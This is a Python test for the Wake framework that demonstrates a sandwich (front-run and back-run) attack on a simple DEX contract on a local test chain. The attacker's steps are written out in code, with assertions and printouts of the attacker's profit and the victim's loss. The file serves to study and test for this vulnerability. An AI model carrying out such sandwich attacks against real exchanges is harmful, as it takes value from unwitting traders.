from wake.testing import *

from pytypes.contracts.stage1.SimpleDEX import SimpleDEX, SimpleToken

def revert_handler(e: RevertError):
    if e.tx is not None:
        print(e.tx.call_trace)


@chain.connect()
@on_revert(revert_handler)
def test_default():
    deployer, victim, attacker = chain.accounts[0:3]

    # Deploy tokens
    tokenA = SimpleToken.deploy("TokenA", "TKA", 10_000 * 10**18, from_=deployer)
    tokenB = SimpleToken.deploy("TokenB", "TKB", 10_000 * 10**18, from_=deployer)

    # Deploy DEX
    dex = SimpleDEX.deploy(tokenA, tokenB, from_=deployer)

    # Add liquidity: 1000 A : 1000 B
    liquidity_amount = 1_000 * 10**18
    tokenA.approve(dex.address, liquidity_amount, from_=deployer)
    tokenB.approve(dex.address, liquidity_amount, from_=deployer)
    dex.addLiquidity(liquidity_amount, liquidity_amount, from_=deployer)

    # Transfer tokens to victim and attacker
    mint_erc20(tokenA, attacker, 200 * 10**18)
    mint_erc20(tokenA, victim, 200 * 10**18)

    # Victim wants to swap 100 tokenA for tokenB
    victim_swap_amount = 100 * 10**18

    # Calculate expected output WITHOUT frontrunning
    expected_output_fair = dex.getAmountOut(
        victim_swap_amount,
        dex.reserveA(),
        dex.reserveB()
    )

    # ATTACK STEP 1: Attacker frontruns with 50 tokenA -> tokenB
    attacker_frontrun_amount = 50 * 10**18
    tokenA.approve(dex.address, attacker_frontrun_amount, from_=attacker)
    attacker_out_1 = dex.swapAforB(attacker_frontrun_amount, from_=attacker)

    # VICTIM'S TRANSACTION: Now executes at worse price
    tokenA.approve(dex.address, victim_swap_amount, from_=victim)
    victim_output = dex.swapAforB(victim_swap_amount, from_=victim).return_value

    # Victim receives LESS than fair price
    assert victim_output < expected_output_fair, "Victim should receive less due to frontrunning"

    # ATTACK STEP 2: Attacker backruns by swapping tokenB back to tokenA
    attacker_balance_b = tokenB.balanceOf(attacker.address)
    tokenB.approve(dex.address, attacker_balance_b, from_=attacker)
    attacker_out_2 = dex.swapBforA(attacker_balance_b, from_=attacker)

    # Attacker profits: ends with more tokenA than they started
    attacker_final_balance_a = tokenA.balanceOf(attacker.address)
    attacker_initial_balance_a = 200 * 10**18

    assert attacker_final_balance_a > attacker_initial_balance_a, "Attacker should profit"

    profit = attacker_final_balance_a - attacker_initial_balance_a
    print(f"Attacker profit: {profit / 10**18} tokenA")
    print(f"Victim received: {victim_output / 10**18} tokenB")
    print(f"Fair price would have been: {expected_output_fair / 10**18} tokenB")
    print(f"Victim loss: {(expected_output_fair - victim_output) / 10**18} tokenB")

